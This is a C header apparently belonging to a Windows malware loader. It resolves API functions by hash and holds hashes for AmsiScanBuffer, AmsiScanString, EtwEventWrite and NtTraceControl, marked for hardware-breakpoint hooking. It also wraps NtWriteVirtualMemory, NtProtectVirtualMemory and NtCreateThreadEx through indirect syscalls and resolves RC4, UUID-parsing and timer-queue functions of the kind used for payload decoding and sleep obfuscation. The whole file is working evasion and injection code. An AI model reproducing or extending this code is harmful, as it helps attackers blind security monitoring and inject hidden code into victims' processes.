#pragma once
#include "Common.h"

typedef enum MODULES
{

    KERNEL32_DLL = 1,
    NTDLL_DLL,
    AMSI_DLL,
    RPCRT4_DLL,
    CRYPTSP_DLL

};

// different inline stuff for different compilers

#ifdef _MSC_VER
	#define FORCEINLINE __forceinline
#elif defined(__GNUC__)
	#define FORCEINLINE inline __attribute__((always_inline))
#else
	#define FORCEINLINE inline
#endif

// hash constants (a lot of them)

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

// Hardware Breakpoint Hashes
// since we wont call these functions, we only have their hashes to get their func addresses

#define          AmsiScanBuffer_HASH     0xBAB3D02E
#define          AmsiScanString_HASH     0xE2500CCB
#define          NtTraceControl_HASH     0x012A85B7
#define          EtwEventWrite_HASH      0x58DEFAE2

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

#define          NtProtectVirtualMemory_HASH     0x50E92888
#define          NtWriteVirtualMemory_HASH       0xC3170192
#define          memcmp_HASH                     0xC0883864
#define          CreateFileW_HASH                0x687D2110
#define          GetFileSize_HASH                0x7B813820
#define          HeapAlloc_HASH                  0xADC4062E
#define          ReadFile_HASH                   0x84D15061
#define          GetThreadContext_HASH           0x6A967222
#define          SetThreadContext_HASH           0xFD1438AE
#define          SystemFunction033_HASH          0xE58C8806
#define          Thread32First_HASH              0x2FD54D2A
#define          CreateToolhelp32Snapshot_HASH   0xF37AC035
#define          OpenThread_HASH                 0xC7073A8F
#define          ResumeThread_HASH               0x8DC7E12E
#define          OpenProcess_HASH                0x8B21E0B6
#define          Thread32Next_HASH               0x85585CE1
#define          SuspendThread_HASH              0x873D5CFF
#define          RtlSecureZeroMemory_HASH        0xFD7C9837
#define          GetProcessHeaps_HASH            0x0EC0FC35
#define          HeapWalk_HASH                   0x4B215612
#define          HeapFree_HASH                   0x4B184B05
#define          ReadProcessMemory_HASH          0x5C3F8699
#define          NtQueryInformationThread_HASH   0xF5A0461B
#define          GetCurrentProcessId_HASH        0x0917DED4
#define          GetCurrentThreadId_HASH         0xD5B078CD
#define          CloseHandle_HASH                0xFDB928E7
#define          Sleep_HASH                      0x0E07CD7E
#define          Process32FirstW_HASH            0xB06FA1A8
#define          _wcsicmp_HASH                   0xF37CB1FA
#define          Process32NextW_HASH             0x43F6E75F
#define          GetCurrentProcess_HASH          0x3F025F67
#define          GetProcessHeap_HASH             0x36C007A2
#define          UuidFromStringA_HASH            0xA2E67A68
#define          _stricmp_HASH                   0xE7295926
#define          NtSetInformationFile_HASH       0xCE250E79
#define          SetFileInformationByHandle_HASH 0xC05EE25E
#define          NtQueryInformationProcess_HASH  0x8CDC5DC2
#define          NtCreateThreadEx_HASH           0xAF18CFB0
#define          LoadLibraryExW_HASH             0x9592AF4E
#define          LoadLibraryW_HASH               0xB7072FF1
#define          NtDelayExecution_HASH           0xF5A936AA
#define          CreateEventW_HASH               0x76B3A892
#define          CreateTimerQueue_HASH           0x7D41D25F
#define          CreateTimerQueueTimer_HASH      0xACE88880
#define          WaitForSingleObject_HASH        0x0DF1B3DA
#define          RtlCaptureContext_HASH          0xEBA8D910
#define          VirtualProtect_HASH             0xE857500D
#define          SetEvent_HASH                   0x9D7FF713
#define          DeleteTimerQueue_HASH           0x1B141EDE
#define          NtContinue_HASH                 0xFC3A6C2C
#define          EnumSystemLocalesA_HASH         0x886A7CC3
#define          FlushInstructionCache_HASH      0xEFB7BF9D
#define          GetModuleFileNameW_HASH         0x206167C3

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

#define			 kernel32_dll_HASH				 0xADD31DF0
#define			 ntdll_dll_HASH					 0x70E61753
#define          Amsi_dll_HASH                   0x85B53BE6
#define          Rpcrt4_dll_HASH                 0xA31BD6B7

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

FORCEINLINE DWORD WINAPI pGetModuleFileNameW
(
    _In_opt_ HMODULE hModule,
    _Out_    LPWSTR  lpFilename,
    _In_     DWORD   nSize
)
{
    DWORD(WINAPI * pFunction)(HMODULE, LPWSTR, DWORD);
    pFunction = (DWORD(WINAPI*)(HMODULE, LPWSTR, DWORD))ResolveHashedFunction(KERNEL32_DLL, GetModuleFileNameW_HASH);
    return pFunction(hModule, lpFilename, nSize);
}

FORCEINLINE BOOL WINAPI pFlushInstructionCache
(
    _In_ HANDLE  hProcess,
    _In_ LPCVOID lpBaseAddress,
    _In_ SIZE_T  dwSize
)
{
    BOOL(WINAPI * pFunction)(HANDLE, LPCVOID, SIZE_T);
    pFunction = (BOOL(WINAPI*)(HANDLE, LPCVOID, SIZE_T))ResolveHashedFunction(KERNEL32_DLL, FlushInstructionCache_HASH);
    return pFunction(hProcess, lpBaseAddress, dwSize);
}

FORCEINLINE BOOL WINAPI pEnumSystemLocalesA
(
    _In_ LOCALE_ENUMPROCA lpLocaleEnumProc,
    _In_ DWORD            dwFlags
)
{
    BOOL(WINAPI * pFunction)(LOCALE_ENUMPROCA, DWORD);
    pFunction = (BOOL(WINAPI*)(LOCALE_ENUMPROCA, DWORD))ResolveHashedFunction(KERNEL32_DLL, EnumSystemLocalesA_HASH);
    return pFunction(lpLocaleEnumProc, dwFlags);
}

FORCEINLINE RPC_STATUS pUuidFromStringA
(
    _In_  RPC_CSTR StringUuid,
    _Out_ UUID* Uuid
)
{
    RPC_STATUS(*pFunction)(RPC_CSTR, UUID*);
    pFunction = (RPC_STATUS(*)(RPC_CSTR, UUID*))ResolveHashedFunction(RPCRT4_DLL, UuidFromStringA_HASH);
    return pFunction(StringUuid, Uuid);
}

FORCEINLINE NTSTATUS WINAPI pSystemFunction033
(
    _Inout_ PUSTRING pData,
    _In_    PUSTRING pKey
)
{
    NTSTATUS(WINAPI * pFunction)(PUSTRING, PUSTRING);
    pFunction = (NTSTATUS(WINAPI*)(PUSTRING, PUSTRING))ResolveHashedFunction(CRYPTSP_DLL, SystemFunction033_HASH);
    return pFunction(pData, pKey);
}

FORCEINLINE HANDLE WINAPI pOpenThread
(
	_In_ DWORD  dwDesiredAccess,
	_In_ BOOL   bInheritHandle,
	_In_ DWORD  dwThreadId
)
{

	HANDLE(WINAPI * pFunction)(DWORD, BOOL, DWORD);
	pFunction = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))ResolveHashedFunction(KERNEL32_DLL, OpenThread_HASH);
	return pFunction(dwDesiredAccess, bInheritHandle, dwThreadId);

}

FORCEINLINE INT pmemcmp // todo: remove
(
    _In_ PVOID  buf1,
    _In_ PVOID  buf2,
    _In_ SIZE_T count
)
{
    INT(*pFunction)(PVOID, PVOID, SIZE_T);
    pFunction = (INT(*)(PVOID, PVOID, SIZE_T))ResolveHashedFunction(NTDLL_DLL, memcmp_HASH);
    return pFunction(buf1, buf2, count);
}

FORCEINLINE PVOID NTAPI pRtlSecureZeroMemory // todo: remove
(
    _Out_ PVOID  ptr,
    _In_  SIZE_T cnt
)
{
    volatile CHAR* p = (volatile CHAR*)ptr;

    while (cnt--)
        *p++ = 0;

    return ptr;
}

FORCEINLINE NTSTATUS NTAPI pNtQueryInformationThread
(
    _In_      HANDLE          ThreadHandle,
    _In_      THREADINFOCLASS ThreadInformationClass,
    _Out_     PVOID           ThreadInformation,
    _In_      ULONG           ThreadInformationLength,
    _Out_opt_ PULONG          ReturnLength
)
{
    NTSTATUS(NTAPI * pFunction)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG);
    pFunction = (NTSTATUS(NTAPI*)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG))ResolveHashedFunction(NTDLL_DLL, NtQueryInformationThread_HASH);
    return pFunction(ThreadHandle, ThreadInformationClass, ThreadInformation, ThreadInformationLength, ReturnLength);
}

FORCEINLINE HANDLE WINAPI pCreateFileW
(
    _In_     LPCWSTR               lpFileName,
    _In_     DWORD                 dwDesiredAccess,
    _In_     DWORD                 dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_     DWORD                 dwCreationDisposition,
    _In_     DWORD                 dwFlagsAndAttributes,
    _In_opt_ HANDLE                hTemplateFile
)
{
    HANDLE(WINAPI * pFunction)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    pFunction = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))ResolveHashedFunction(KERNEL32_DLL, CreateFileW_HASH);
    return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

FORCEINLINE DWORD WINAPI pGetFileSize
(
    _In_      HANDLE  hFile,
    _Out_opt_ LPDWORD lpFileSizeHigh
)
{
    DWORD(WINAPI * pFunction)(HANDLE, LPDWORD);
    pFunction = (DWORD(WINAPI*)(HANDLE, LPDWORD))ResolveHashedFunction(KERNEL32_DLL, GetFileSize_HASH);
    return pFunction(hFile, lpFileSizeHigh);
}

FORCEINLINE BOOL WINAPI pReadFile
(
    _In_        HANDLE       hFile,
    _Out_       LPVOID       lpBuffer,
    _In_        DWORD        nNumberOfBytesToRead,
    _Out_opt_   LPDWORD      lpNumberOfBytesRead,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
)
{
    BOOL(WINAPI * pFunction)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    pFunction = (BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))ResolveHashedFunction(KERNEL32_DLL, ReadFile_HASH);
    return pFunction(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
}

FORCEINLINE BOOL WINAPI pGetThreadContext
(
    _In_    HANDLE    hThread,
    _Inout_ LPCONTEXT lpContext
)
{
    BOOL(WINAPI * pFunction)(HANDLE, LPCONTEXT);
    pFunction = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))ResolveHashedFunction(KERNEL32_DLL, GetThreadContext_HASH);
    return pFunction(hThread, lpContext);
}

FORCEINLINE BOOL WINAPI pSetThreadContext
(
    _In_ HANDLE         hThread,
    _In_ const CONTEXT* lpContext
)
{
    BOOL(WINAPI * pFunction)(HANDLE, const CONTEXT*);
    pFunction = (BOOL(WINAPI*)(HANDLE, const CONTEXT*))ResolveHashedFunction(KERNEL32_DLL, SetThreadContext_HASH);
    return pFunction(hThread, lpContext);
}

FORCEINLINE BOOL WINAPI pThread32First
(
    _In_    HANDLE          hSnapshot,
    _Inout_ LPTHREADENTRY32 lpte
)
{
    BOOL(WINAPI * pFunction)(HANDLE, LPTHREADENTRY32);
    pFunction = (BOOL(WINAPI*)(HANDLE, LPTHREADENTRY32))ResolveHashedFunction(KERNEL32_DLL, Thread32First_HASH);
    return pFunction(hSnapshot, lpte);
}

FORCEINLINE BOOL WINAPI pThread32Next
(
    _In_  HANDLE          hSnapshot,
    _Out_ LPTHREADENTRY32 lpte
)
{
    BOOL(WINAPI * pFunction)(HANDLE, LPTHREADENTRY32);
    pFunction = (BOOL(WINAPI*)(HANDLE, LPTHREADENTRY32))ResolveHashedFunction(KERNEL32_DLL, Thread32Next_HASH);
    return pFunction(hSnapshot, lpte);
}

FORCEINLINE HANDLE WINAPI pCreateToolhelp32Snapshot
(
    _In_ DWORD dwFlags,
    _In_ DWORD th32ProcessID
)
{
    HANDLE(WINAPI * pFunction)(DWORD, DWORD);
    pFunction = (HANDLE(WINAPI*)(DWORD, DWORD))ResolveHashedFunction(KERNEL32_DLL, CreateToolhelp32Snapshot_HASH);
    return pFunction(dwFlags, th32ProcessID);
}

FORCEINLINE DWORD WINAPI pResumeThread
(
    _In_ HANDLE hThread
)
{
    DWORD(WINAPI * pFunction)(HANDLE);
    pFunction = (DWORD(WINAPI*)(HANDLE))ResolveHashedFunction(KERNEL32_DLL, ResumeThread_HASH);
    return pFunction(hThread);
}

FORCEINLINE DWORD WINAPI pSuspendThread
(
    _In_ HANDLE hThread
)
{
    DWORD(WINAPI * pFunction)(HANDLE);
    pFunction = (DWORD(WINAPI*)(HANDLE))ResolveHashedFunction(KERNEL32_DLL, SuspendThread_HASH);
    return pFunction(hThread);
}

FORCEINLINE HANDLE WINAPI pOpenProcess
(
    _In_ DWORD dwDesiredAccess,
    _In_ BOOL  bInheritHandle,
    _In_ DWORD dwProcessId
)
{
    HANDLE(WINAPI * pFunction)(DWORD, BOOL, DWORD);
    pFunction = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))ResolveHashedFunction(KERNEL32_DLL, OpenProcess_HASH);
    return pFunction(dwDesiredAccess, bInheritHandle, dwProcessId);
}

FORCEINLINE DWORD WINAPI pGetProcessHeaps
(
    _In_  DWORD   NumberOfHeaps,
    _Out_ PHANDLE ProcessHeaps
)
{
    DWORD(WINAPI * pFunction)(DWORD, PHANDLE);
    pFunction = (DWORD(WINAPI*)(DWORD, PHANDLE))ResolveHashedFunction(KERNEL32_DLL, GetProcessHeaps_HASH);
    return pFunction(NumberOfHeaps, ProcessHeaps);
}

FORCEINLINE BOOL WINAPI pHeapWalk
(
    _In_    HANDLE               hHeap,
    _Inout_ LPPROCESS_HEAP_ENTRY lpEntry
)
{
    BOOL(WINAPI * pFunction)(HANDLE, LPPROCESS_HEAP_ENTRY);
    pFunction = (BOOL(WINAPI*)(HANDLE, LPPROCESS_HEAP_ENTRY))ResolveHashedFunction(KERNEL32_DLL, HeapWalk_HASH);
    return pFunction(hHeap, lpEntry);
}

FORCEINLINE BOOL WINAPI pHeapFree
(
    _In_ HANDLE hHeap,
    _In_ DWORD  dwFlags,
    _In_ LPVOID lpMem
)
{
    BOOL(WINAPI * pFunction)(HANDLE, DWORD, LPVOID);
    pFunction = (BOOL(WINAPI*)(HANDLE, DWORD, LPVOID))ResolveHashedFunction(KERNEL32_DLL, HeapFree_HASH);
    return pFunction(hHeap, dwFlags, lpMem);
}

FORCEINLINE BOOL WINAPI pReadProcessMemory
(
    _In_  HANDLE  hProcess,
    _In_  LPCVOID lpBaseAddress,
    _Out_ LPVOID  lpBuffer,
    _In_  SIZE_T  nSize,
    _Out_ SIZE_T* lpNumberOfBytesRead
)
{
    BOOL(WINAPI * pFunction)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
    pFunction = (BOOL(WINAPI*)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*))ResolveHashedFunction(KERNEL32_DLL, ReadProcessMemory_HASH);
    return pFunction(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
}

FORCEINLINE INT p_wcsicmp
(
    _In_ LPCWSTR str1,
    _In_ LPCWSTR str2
)
{
    INT(*pFunction)(LPCWSTR, LPCWSTR);
    pFunction = (INT(*)(LPCWSTR, LPCWSTR))ResolveHashedFunction(NTDLL_DLL, _wcsicmp_HASH);
    return pFunction(str1, str2);
}

FORCEINLINE DWORD WINAPI pGetCurrentProcessId(VOID)
{
    DWORD(WINAPI * pFunction)(VOID);
    pFunction = (DWORD(WINAPI*)(VOID))ResolveHashedFunction(KERNEL32_DLL, GetCurrentProcessId_HASH);
    return pFunction();
}

FORCEINLINE DWORD WINAPI pGetCurrentThreadId(VOID)
{
    DWORD(WINAPI * pFunction)(VOID);
    pFunction = (DWORD(WINAPI*)(VOID))ResolveHashedFunction(KERNEL32_DLL, GetCurrentThreadId_HASH);
    return pFunction();
}

FORCEINLINE BOOL WINAPI pCloseHandle
(
    _In_ HANDLE hObject
)
{
    BOOL(WINAPI * pFunction)(HANDLE);
    pFunction = (BOOL(WINAPI*)(HANDLE))ResolveHashedFunction(KERNEL32_DLL, CloseHandle_HASH);
    return pFunction(hObject);
}

FORCEINLINE VOID WINAPI pSleep
(
    _In_ DWORD dwMilliseconds
)
{
    VOID(WINAPI * pFunction)(DWORD);
    pFunction = (VOID(WINAPI*)(DWORD))ResolveHashedFunction(KERNEL32_DLL, Sleep_HASH);
    return pFunction(dwMilliseconds);
}

FORCEINLINE BOOL WINAPI pProcess32FirstW
(
    _In_    HANDLE             hSnapshot,
    _Inout_ LPPROCESSENTRY32W  lppe
)
{
    BOOL(WINAPI * pFunction)(HANDLE, LPPROCESSENTRY32W);
    pFunction = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W))ResolveHashedFunction(KERNEL32_DLL, Process32FirstW_HASH);
    return pFunction(hSnapshot, lppe);
}

FORCEINLINE BOOL WINAPI pProcess32NextW
(
    _In_  HANDLE             hSnapshot,
    _Out_ LPPROCESSENTRY32W  lppe
)
{
    BOOL(WINAPI * pFunction)(HANDLE, LPPROCESSENTRY32W);
    pFunction = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W))ResolveHashedFunction(KERNEL32_DLL, Process32NextW_HASH);
    return pFunction(hSnapshot, lppe);
}


FORCEINLINE HANDLE WINAPI pGetCurrentProcess(VOID)
{
    HANDLE(WINAPI * pFunction)(VOID);
    pFunction = (HANDLE(WINAPI*)(VOID))ResolveHashedFunction(KERNEL32_DLL, GetCurrentProcess_HASH);
    return pFunction();
}

FORCEINLINE HANDLE WINAPI pGetProcessHeap(VOID)
{
    HANDLE(WINAPI * pFunction)(VOID);
    pFunction = (HANDLE(WINAPI*)(VOID))ResolveHashedFunction(KERNEL32_DLL, GetProcessHeap_HASH);
    return pFunction();
}

FORCEINLINE INT p_stricmp
(
    _In_ LPCSTR str1,
    _In_ LPCSTR str2
)
{
    INT(*pFunction)(LPCSTR, LPCSTR);
    pFunction = (INT(*)(LPCSTR, LPCSTR))ResolveHashedFunction(NTDLL_DLL, _stricmp_HASH);
    return pFunction(str1, str2);
}

FORCEINLINE NTSTATUS NTAPI pNtSetInformationFile
(
    _In_  HANDLE           FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_  PVOID            FileInformation,
    _In_  ULONG            Length,
    _In_  ULONG            FileInformationClass
)
{
    NTSTATUS(NTAPI * pFunction)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, ULONG);
    pFunction = (NTSTATUS(NTAPI*)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, ULONG))ResolveHashedFunction(NTDLL_DLL, NtSetInformationFile_HASH);
    return pFunction(FileHandle, IoStatusBlock, FileInformation, Length, FileInformationClass);
}

FORCEINLINE BOOL WINAPI pSetFileInformationByHandle
(
    _In_ HANDLE hFile,
    _In_ ULONG  FileInformationClass,
    _In_ LPVOID lpFileInformation,
    _In_ DWORD  dwBufferSize
)
{
    BOOL(WINAPI * pFunction)(HANDLE, ULONG, LPVOID, DWORD);
    pFunction = (BOOL(WINAPI*)(HANDLE, ULONG, LPVOID, DWORD))ResolveHashedFunction(KERNEL32_DLL, SetFileInformationByHandle_HASH);
    return pFunction(hFile, FileInformationClass, lpFileInformation, dwBufferSize);
}

FORCEINLINE NTSTATUS NTAPI pNtQueryInformationProcess
(
    _In_      HANDLE           ProcessHandle,
    _In_      ULONG            ProcessInformationClass,
    _Out_     PVOID            ProcessInformation,
    _In_      ULONG            ProcessInformationLength,
    _Out_opt_ PULONG           ReturnLength
)
{
    NTSTATUS(NTAPI * pFunction)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    pFunction = (NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG))ResolveHashedFunction(NTDLL_DLL, NtQueryInformationProcess_HASH);
    return pFunction(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
}

FORCEINLINE HMODULE WINAPI pLoadLibraryW
(
    _In_ LPCWSTR lpLibFileName
)
{
    HMODULE(WINAPI * pFunction)(LPCWSTR);
    pFunction = (HMODULE(WINAPI*)(LPCWSTR))ResolveHashedFunction(KERNEL32_DLL, LoadLibraryW_HASH);
    return pFunction(lpLibFileName);
}

FORCEINLINE HMODULE WINAPI pLoadLibraryExW
(
    _In_       LPCWSTR lpLibFileName,
    _Reserved_ HANDLE  hFile,
    _In_       DWORD   dwFlags
)
{
    HMODULE(WINAPI * pFunction)(LPCWSTR, HANDLE, DWORD);
    pFunction = (HMODULE(WINAPI*)(LPCWSTR, HANDLE, DWORD))ResolveHashedFunction(KERNEL32_DLL, LoadLibraryExW_HASH);
    return pFunction(lpLibFileName, hFile, dwFlags);
}

FORCEINLINE VOID NTAPI pRtlCaptureContext
(
    _Out_ PCONTEXT ContextRecord
)
{
    VOID(NTAPI * pFunction)(PCONTEXT);
    pFunction = (VOID(NTAPI*)(PCONTEXT))ResolveHashedFunction(NTDLL_DLL, RtlCaptureContext_HASH);
    return pFunction(ContextRecord);
}

FORCEINLINE HANDLE WINAPI pCreateEventW
(
    _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,
    _In_     BOOL                  bManualReset,
    _In_     BOOL                  bInitialState,
    _In_opt_ LPCWSTR               lpName
)
{
    HANDLE(WINAPI * pFunction)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
    pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR))ResolveHashedFunction(KERNEL32_DLL, CreateEventW_HASH);
    return pFunction(lpEventAttributes, bManualReset, bInitialState, lpName);
}

FORCEINLINE DWORD WINAPI pWaitForSingleObject
(
    _In_ HANDLE hHandle,
    _In_ DWORD  dwMilliseconds
)
{
    DWORD(WINAPI * pFunction)(HANDLE, DWORD);
    pFunction = (DWORD(WINAPI*)(HANDLE, DWORD))ResolveHashedFunction(KERNEL32_DLL, WaitForSingleObject_HASH);
    return pFunction(hHandle, dwMilliseconds);
}

FORCEINLINE BOOL WINAPI pVirtualProtect
(
    _In_  LPVOID lpAddress,
    _In_  SIZE_T dwSize,
    _In_  DWORD  flNewProtect,
    _Out_ PDWORD lpflOldProtect
)
{
    BOOL(WINAPI * pFunction)(LPVOID, SIZE_T, DWORD, PDWORD);
    pFunction = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))ResolveHashedFunction(KERNEL32_DLL, VirtualProtect_HASH);
    return pFunction(lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

FORCEINLINE BOOL WINAPI pSetEvent
(
    _In_ HANDLE hEvent
)
{
    BOOL(WINAPI * pFunction)(HANDLE);
    pFunction = (BOOL(WINAPI*)(HANDLE))ResolveHashedFunction(KERNEL32_DLL, SetEvent_HASH);
    return pFunction(hEvent);
}

FORCEINLINE HANDLE WINAPI pCreateTimerQueue(VOID)
{
    HANDLE(WINAPI * pFunction)(VOID);
    pFunction = (HANDLE(WINAPI*)(VOID))ResolveHashedFunction(KERNEL32_DLL, CreateTimerQueue_HASH);
    return pFunction();
}

FORCEINLINE BOOL WINAPI pCreateTimerQueueTimer
(
    _Out_    PHANDLE PhNewTimer,
    _In_opt_ HANDLE  TimerQueue,
    _In_     PVOID   Callback,
    _In_opt_ PVOID   Parameter,
    _In_     DWORD   DueTime,
    _In_     DWORD   Period,
    _In_     ULONG   Flags
)
{
    BOOL(WINAPI * pFunction)(PHANDLE, HANDLE, PVOID, PVOID, DWORD, DWORD, ULONG);
    pFunction = (BOOL(WINAPI*)(PHANDLE, HANDLE, PVOID, PVOID, DWORD, DWORD, ULONG))ResolveHashedFunction(KERNEL32_DLL, CreateTimerQueueTimer_HASH);
    return pFunction(PhNewTimer, TimerQueue, Callback, Parameter, DueTime, Period, Flags);
}

FORCEINLINE BOOL WINAPI pDeleteTimerQueue
(
    _In_ HANDLE TimerQueue
)
{
    BOOL(WINAPI * pFunction)(HANDLE);
    pFunction = (BOOL(WINAPI*)(HANDLE))ResolveHashedFunction(KERNEL32_DLL, DeleteTimerQueue_HASH);
    return pFunction(TimerQueue);
}

FORCEINLINE NTSTATUS NTAPI pNtContinue
(
    _In_ PCONTEXT ContextRecord,
    _In_ BOOLEAN  TestAlert
)
{
    NTSTATUS(NTAPI * pFunction)(PCONTEXT, BOOLEAN);
    pFunction = (NTSTATUS(NTAPI*)(PCONTEXT, BOOLEAN))ResolveHashedFunction(NTDLL_DLL, NtContinue_HASH);
    return pFunction(ContextRecord, TestAlert);
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

// functions for indirect syscalls specifically

FORCEINLINE NTSTATUS NTAPI pNtProtectVirtualMemory
(
    _In_    HANDLE  ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_    ULONG   NewProtect,
    _Out_   PULONG  OldProtect
)
{
    SyscallInfo SyscallConfig = { 0 };

    if (!InvokeSyscalls(&SyscallConfig, NTDLL_DLL, NtProtectVirtualMemory_HASH))
        return STATUS_UNSUCCESSFUL;

    InitIndirect(SyscallConfig.SyscallInfo.SyscallNumber, SyscallConfig.SyscallInfo.SyscallInstruction);

    return ExecuteIndirect(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);

}

FORCEINLINE NTSTATUS NTAPI pNtWriteVirtualMemory
(
    _In_      HANDLE  ProcessHandle,
    _In_      PVOID   BaseAddress,
    _In_      PVOID   Buffer,
    _In_      SIZE_T  NumberOfBytesToWrite,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
)
{
    SyscallInfo SyscallConfig = { 0 };

    if (!InvokeSyscalls(&SyscallConfig, NTDLL_DLL, NtWriteVirtualMemory_HASH))
        return STATUS_UNSUCCESSFUL;

    InitIndirect(SyscallConfig.SyscallInfo.SyscallNumber, SyscallConfig.SyscallInfo.SyscallInstruction);

    return ExecuteIndirect(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);

}

FORCEINLINE NTSTATUS NTAPI pNtCreateThreadEx
(
    _Out_     PHANDLE            ThreadHandle,
    _In_      ACCESS_MASK        DesiredAccess,
    _In_opt_  PVOID              ObjectAttributes,
    _In_      HANDLE             ProcessHandle,
    _In_      PVOID              StartRoutine,
    _In_opt_  PVOID              Argument,
    _In_      ULONG              CreateFlags,
    _In_opt_  SIZE_T             ZeroBits,
    _In_opt_  SIZE_T             StackSize,
    _In_opt_  SIZE_T             MaximumStackSize,
    _In_opt_  PVOID              AttributeList
)
{
    SyscallInfo SyscallConfig = { 0 };

    if (!InvokeSyscalls(&SyscallConfig, NTDLL_DLL, NtCreateThreadEx_HASH))
        return STATUS_UNSUCCESSFUL;

    InitIndirect(SyscallConfig.SyscallInfo.SyscallNumber, SyscallConfig.SyscallInfo.SyscallInstruction);

    return ExecuteIndirect(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

FORCEINLINE NTSTATUS NTAPI pNtDelayExecution
(
    _In_ BOOLEAN        Alertable,
    _In_ PLARGE_INTEGER DelayInterval
)
{
    SyscallInfo SyscallConfig = { 0 };

    if (!InvokeSyscalls(&SyscallConfig, NTDLL_DLL, NtDelayExecution_HASH))
        return STATUS_UNSUCCESSFUL;

    InitIndirect(SyscallConfig.SyscallInfo.SyscallNumber, SyscallConfig.SyscallInfo.SyscallInstruction);

    return ExecuteIndirect(Alertable, DelayInterval);
}